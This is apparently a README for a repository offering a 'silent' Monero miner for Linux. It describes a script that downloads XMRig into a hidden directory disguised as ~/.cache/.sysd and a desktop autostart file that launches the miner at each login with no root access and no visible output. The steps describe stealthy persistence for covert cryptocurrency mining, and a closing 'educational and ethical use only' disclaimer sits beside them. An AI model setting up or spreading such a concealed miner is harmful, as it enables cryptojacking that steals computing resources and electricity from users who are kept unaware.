# Silent Monero Miner AutoStart

This repository contains two files for auto-starting a silent CPU-based Monero miner on Linux without root or visible output.

## Files

- `start.sh`: Bash script that downloads, installs, and runs XMRig miner in a hidden directory.
- `silentminer.desktop`: Autostart file that triggers the miner automatically when the user logs in.

## Usage

1. Edit the wallet address inside `start.sh`:
   ```
   WALLET="44...YOUR_WALLET"
   ```

2. Place the script in:
   ```
   ~/.cache/.sysd/start.sh
   ```

3. Copy the `.desktop` file to:
   ```
   ~/.config/autostart/silentminer.desktop
   ```

4. Ensure `start.sh` is executable:
   ```
   chmod +x ~/.cache/.sysd/start.sh
   ```

The miner will start automatically and run silently in the background at every login.

> ⚠️ For educational and ethical use only.
